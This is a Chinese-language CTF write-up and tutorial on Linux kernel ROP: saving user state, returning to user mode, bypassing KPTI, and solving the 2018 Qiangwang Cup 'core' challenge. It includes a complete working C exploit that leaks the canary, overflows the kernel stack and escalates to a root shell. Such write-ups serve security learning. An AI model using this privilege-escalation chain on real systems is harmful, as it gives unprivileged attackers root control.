# Kernel ROP basic

> 会内核pwn的人看起来就像带黑阔 (*￣3￣)╭

ROP即`返回导向编程`（Return-oriented programming），是一种比较熟悉的一种攻击方式——通过复用代码片段的方式控制程序执行流。

**内核态的 ROP 与用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ropchain 由**`system("/bin/sh")`**变为了**`commit_creds(prepare_kernel_cred(NULL))`

当成功执行 `commit_creds(prepare_kernel_cred(NULL))` 之后，当前线程的 cred 结构体便变为 init 进程的 cred 的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell。

## 0x00 保存状态

一般情况下，我们的exploit需要在内核中完成提权，但最终还是要返回用户态来获得一个有root权限的shell。

因此，在exploit进入内核之前，我们需要**手动**保存当前的状态，也就是**保存当前寄存器的值到内核栈**上，便于之后我们返回用户态。

一个常见的模板：

````c
size_t user_cs, user_ss, user_rflags, user_sp;
void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}
````

> 方便起见，使用了内联汇编，编译时需要指定参数：`-masm=intel`

## 0x01 返回用户态

程序返回用户态的过程，简单来说就是

- `swapgs`指令恢复用户态GS寄存器
- `sysretq`或者`iretq`恢复到用户空间

那么我们只需要在内核中找到相应的gadget并执行`swapgs;iretq`就可以成功着陆回用户态

通常的ROP需要下面的链子：

```c
swapgs;
iretq;
user_shell_addr;
user_cs;
user_eflags; //64bit user_rflags
user_sp;
user_ss;
```

## 0x02 KPTI bypass

### 1. KPTI介绍

**KPTI-Kernel Page Table Isolation：内核页表隔离**

用户态不可看到内核态的页表；内核态不可执行用户态的代码（模拟）

KPTI 机制最初的主要目的是为了缓解 KASLR 的绕过以及 CPU 侧信道攻击。

在 KPTI 机制中，内核态空间的内存和用户态空间的内存的隔离进一步得到了增强。

- 内核态中的页表包括用户空间内存的页表和内核空间内存的页表。
- 用户态的页表只包括用户空间内存的页表以及必要的内核空间内存的页表，如用于处理系统调用、中断等信息的内存。

在 x86_64 的 PTI 机制中，内核态的用户空间内存映射部分被全部标记为不可执行。也就是说，之前不具有 SMEP 特性的硬件，如果开启了 KPTI 保护，也具有了类似于 SMEP 的特性。此外，SMAP 模拟也可以以类似的方式引入，只是现在还没有引入。因此，在目前开启了 KPTI 保护的内核中，如果没有开启 SMAP 保护，那么内核仍然可以访问用户态空间的内存，只是不能跳转到用户态空间执行 Shellcode。

Linux 4.15 中引入了 KPTI 机制，并且该机制被反向移植到了 Linux 4.14.11，4.9.75，4.4.110。

### 2. ROP中的KPTI绕过

返回用户态之后，我们也要将页表切换回用户态的页表。

众所周知 Linux 采用**四级页表**结构（PGD->PUD->PMD->PTE），而 CR3 控制寄存器用以存储当前的 PGD 的地址，因此在开启 KPTI 的情况下用户态与内核态之间的切换便涉及到 CR3 的切换，为了提高切换的速度，内核将内核空间的 PGD 与用户空间的 PGD 两张页全局目录表放在一段连续的内存中（两张表，一张一页4k，总计8k，内核空间的在低地址，用户空间的在高地址），这样**只需要将 CR3 的第 13 位取反便能完成页表切换的操作**

除了在系统调用入口中将用户态页表切换到内核态页表的代码外，内核也相应地在`arch/x86/entry/entry_64.S` 中提供了一个用于完成内核态页表切换回到用户态页表的函数 `swapgs_restore_regs_and_return_to_usermode`，地址可以在 `/proc/kallsyms` 中获得

这个函数大概实现了下面的操作

```assembly
mov        rdi, cr3
or         rdi, 0x1000
mov        cr3, rdi
pop        rax
pop        rdi
swapgs
iretq
```

所以我们需要构造的ROP链变成了：

````c
swapgs_restore_regs_and_return_to_usermode
0 // padding
0 // padding
user_shell_addr
user_cs
user_rflags
user_sp
user_ss
````

## 0x03 例题

> 强网杯2018 - core

题目给了core.cpio，bzImage和vmlinux以及启动脚本start.sh，我们逐个来分析

### 1. 附件分析

#### I. start.sh

````bash
qemu-system-x86_64 \
-m 64M \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
````

参数分析

- `-m 64M` ：虚拟机内存大小为64mb
- `-kernel ./bzImage`：内存镜像路径
- `-initrd ./core.cpio`：磁盘镜像路径
- `-append`：附加参数选项
  - `root=/dev/ram`：指定根文件系统所在的设备
  - `rw`：指定以rw的方式挂载根文件系统
  - `console=ttyS0`：指定终端为`/dev/ttyS0`，这样一启动就能进入终端界面
  - `oops=panic panic=1`：打印内核基本信息
  - `kalsr`：**开启内核地址随机化**
- `-s`：相当于`-gdb tcp::1234`的简写（也可以直接这么写），后续我们可以通过gdb连接本地端口进行调试
- `-netdev user`：让客户机使用不需要管理员权限的用户模式网络
- `-nographic`：完全关闭QEMU的图形界面输出

更多参数查阅[ qemu命令行参数 ](https://www.codeleading.com/article/21323783517/)

#### II. init

解压core.cpio得到init文件

````sh
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko

poweroff -d 120 -f &
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f
````

这里重点关注这几行：

```sh
cat /proc/kallsyms > /tmp/kallsyms
```

`/proc/kallsyms`是内核符号表文件，这里直接导出了符号表到/tmp目录下，其中包括`commit_creds()`和`prepare_kernel_cred()` 等函数的地址。

```sh
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
```

修改了内核参数kptr_restrict和dmesg_restrict的值

| kptr_restrict | 权限描述                                                     |
| ------------- | ------------------------------------------------------------ |
| 2             | 内核将符号地址打印为全0, root和普通用户都没有权限读取内核符号表 |
| 1             | root用户有权限读取内核符号表, 普通用户没有权限               |
| 0             | root和普通用户都可以读取内核符号表                           |

当`/proc/sys/kernel/dmesg_restrict`为**1**时，将不允许用户使用`dmesg`命令。

所以这里禁止了普通用户查看内核符号表也就是`/proc/kallsyms`，同时不允许使用dmesg命令

> dmesg命令: 用于显示开机信息

但是由于已经把内核符号表保存到了tmp文件夹，所以这里我们还是可以读取符号表。

```sh
poweroff -d 120 -f &
```

定时关机，在调试的时候可以把这行去掉重新打包

最后，出意外的话`core.ko`就是存在漏洞的内核模块。

#### III.  gen_cpio.sh

在内核文件里同样发现一个gen_cpio.sh脚本

```sh
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 > $1
```

分析不难知道这是一个方便内核文件打包的脚本

### 2. 驱动分析

首先checksec检查：

![](https://pic.imgdb.cn/item/626a6347239250f7c55e94a9.png)

没有开启PIE但是开启了canary和NX保护，以及got表可以修改。

之后就是拖进IDA pro进行分析：

![](https://pic.imgdb.cn/item/626a648e239250f7c561f266.png)

注册了一个进程节点文件`/proc/core`，这也是我们后续与内核模块间通信的媒介

我们跟进去core_fops结构体，发现之定义了三个回调函数

![](https://pic.imgdb.cn/item/626a6531239250f7c5638030.png)

定义了三个回调函数：`core_write()` ; `core_ioctl()` ;` core_release()` ;

其中`core_release()`仅为打印功能

`core_write()`函数允许用户向bss段上写入最多`0x800`字节的内容。

![](https://pic.imgdb.cn/item/626a6695239250f7c5679d4d.png)

`core_ioctl()`函数允许我们调用`core_read`和`core_copy_func`这两个函数，以及设置全局变量`off`的值

![](https://pic.imgdb.cn/item/626a6731239250f7c569c408.png)

`core_read()`函数允许我们从栈上读取输入，由于偏移off可控，我们可以读出canary的值

![](https://pic.imgdb.cn/item/626a699b239250f7c57102f1.png)

`core_copy_func()`函数允许我们拷贝bss段上name的值到栈上，由于长度参数只取低16位，存在整数溢出

![](https://pic.imgdb.cn/item/626a6a27239250f7c5725e58.png)

我们构造合适的负数，最多可以拷贝0xFFFF字节的数据，造成内核栈溢出。

### 3. 思路&Exploit

#### I. 解题思路

- 利用`core_ioctl()`函数修改全局变量off
- 使用`core_read()`以及合适的参数off泄露出canary的值
- 调用`core_write()`函数往bss段上填写我们的ROP链条
- 之后用`core_copy_func()`函数构造栈溢出rop执行`commit_creds(prepare_kernel_cred(0))`提权
- 最后返回用户态，通过 `system("/bin/sh")` 等起 shell

#### II. exploit编写

```c
//  musl-gcc ./exploit.c --static -masm='intel' -o ./exploit

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>

// 重新提取vmlinux，附件给的vmlinux有点问题
// ropper查找新提取的vmlinux
// ropper查找的偏移是默认的0xffffffff81000000
#define POP_RDI 0x000b2f;
#define POP_RDX 0x0a0f49;
#define POP_RCX 0x021e53;
#define MOV_RDI_RAX_CALL_RDX 0x01aa6a;
#define SWAPGS_POPFQ 0xa012da;
#define IRETQ 0x3eb448;


// commit_creds(prepare_kernel_cred(NULL))

size_t commit_creds = NULL;
size_t prepare_kernel_cred = NULL;
size_t user_cs,user_ss,user_rflags,user_sp;
// size_t vmlinux_base = 0;
void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved.\n");
}

void core_read(int fd,char *buf){
    ioctl(fd,0x6677889B,buf);
}

void set_off(int fd,size_t off){
    ioctl(fd,0x6677889C,off);
}
void core_copy_func(int fd,size_t n){
    ioctl(fd,0x6677889A,n);
}
void get_shell(){
    if(!getuid()){
        printf("ROOT NOW!");
        system("/bin/sh");
    }else{
        printf("NO ROOT");
        exit(-1);
    }
}


int main(){
    saveStatus();
    int fd = open("/proc/core",2);
    if(fd < 0){
        printf("cannot open '/proc/core' \n");
        exit(-1);
    }
    printf("[*]Open '/proc/core' ....\n");

    //get addr
    FILE * sys_table_fd = fopen("/tmp/kallsyms","r");
    if(sys_table_fd < 0){
        printf("cannot open '/tmp/kallsyms' \n");
        exit(-1);
    }
    printf("[*]Open '/tmp/kallsyms' ....\n");
    char buf[0x50]={0};
    while(fgets(buf,0x50,sys_table_fd)){
        if(commit_creds & prepare_kernel_cred)
            break;
        if(strstr(buf,"commit_creds") && !commit_creds){
            char hex[20]={0};
            strncpy(hex,buf,16);
            sscanf(hex,"%llx",&commit_creds);
            printf("[*]commit_creds addr: %p\n", commit_creds);
        }
        if(strstr(buf,"prepare_kernel_cred") && !prepare_kernel_cred){
            char hex[20]={0};
            strncpy(hex,buf,16);
            sscanf(hex,"%llx",&prepare_kernel_cred);
            printf("[*]prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
        }
    }

    /*
    [*] '/home/mark/Desktop/pwn/core/vmlinux'
    Arch:     amd64-64-little
    Version:  4.15.8
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0xffffffff81000000)
    RWX:      Has RWX segments
    commit_creds 0x9c8e0
    prepare_kernel_cred 0x09cce0
    */    
	
    // qemu 参数修改成nokalsr，然后head /proc/kallsyms查找基地址，手动算偏移
    size_t vmlinux_base = commit_creds - 0x9c8e0;
    printf("[*]vmlinux_base : %p\n",vmlinux_base);
    printf("[*]vmlinux_base : %p\n",prepare_kernel_cred - 0x09cce0);

    //get canary
    size_t canary;
    set_off(fd,64); //0x50-0x40
    char buf2[0x50]={0};
    core_read(fd,buf2);
    canary = ((size_t *)buf2)[0];
    printf("[*]Canary : %p\n",canary);

    //ROP
    size_t rop_chain[0x1000]={0};
    int i=0;
    for(;i<10;i++){
        rop_chain[i] = canary;
    }
    // RAX = prepare_kernel_cred(0)
    rop_chain[i++]=vmlinux_base + POP_RDI;
    rop_chain[i++]=0;
    rop_chain[i++]=prepare_kernel_cred;

    // commit_creds(RAX)
    rop_chain[i++]=vmlinux_base + POP_RDX;
    rop_chain[i++]=vmlinux_base + POP_RCX; //pop rcx
    rop_chain[i++]=vmlinux_base + MOV_RDI_RAX_CALL_RDX; 
    // 'call rdx' will push self_addr+1,we can 'pop rcx' to pop self_addr+1 to ROP
    rop_chain[i++]=commit_creds;

    // swapgs & iretq
    rop_chain[i++]=vmlinux_base + SWAPGS_POPFQ;
    rop_chain[i++]=0;
    rop_chain[i++]=vmlinux_base + IRETQ;

    // getshell
    rop_chain[i++]=(size_t)get_shell;
    rop_chain[i++] = user_cs;
    rop_chain[i++] = user_rflags;
    rop_chain[i++] = user_sp;
    rop_chain[i++] = user_ss;


    write(fd,rop_chain,0x100);
    core_copy_func(fd,0xffffffffffff0000 | (0x100)); // int16 == 0x100
    
    return 0;
}
```

提权效果：

![](https://pic.imgdb.cn/item/626ba810239250f7c5d8ef9d.png)

## 0xFF 后记

这个题我复现了整整1天半。。。。

期间遇到了好多问题，首先是各个WP给出的算偏移的方式不一样还让我一愣

~~（怎么还会有人算地址之间offset来算真实地址啊）~~

这题附件给的vmlinux还是感觉有点问题，我拿这题给的vmlinux算出来的函数或者gadget的偏移都是错的

最后用extract-vmlinux重新提取了个vmlinux才解决这个问题。。

以及最后rop部分在调用commit_creds函数的时候我傻不拉几的加了基地址，gdb调了一万年才看出来。

最后分享[@jingyinghua](https://cainiao159357.github.io/)大爹和我说的gdb调试技巧，gdb不要让他断在push操作，打个断点直接跳过去，不然直接会卡死，我也也不会知道为啥ε(┬┬﹏┬┬)3
